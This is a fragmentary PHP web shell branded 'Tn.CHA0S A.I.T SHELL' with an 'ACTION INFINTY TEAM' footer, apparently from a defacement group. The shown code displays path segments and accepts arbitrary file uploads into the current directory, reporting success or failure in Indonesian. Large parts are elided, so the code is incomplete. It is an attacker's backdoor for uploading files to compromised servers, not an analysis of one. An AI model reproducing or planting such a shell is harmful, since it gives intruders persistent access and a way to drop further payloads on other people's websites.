...
<title>Tn.CHA0S A.I.T SHELL ACCES</title>
...
font-family:Iceland;
"> Tn.CHA0S A.I.T SHELL</font></center>
...
$i++){ echo "$paths[$i]";
 ...
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="green">Sukses Tn.CHA0S A.I.T :)</font><br />';
 }else{ echo '<font color="red">Gagal Tn.CHA0S A.I.T :(</font><br/>';
...
<input type="submit" value=">">
 ...
 } echo '<center><br/><p> ACTION INFINTY TEAM</p></center>
</body>
</html>';
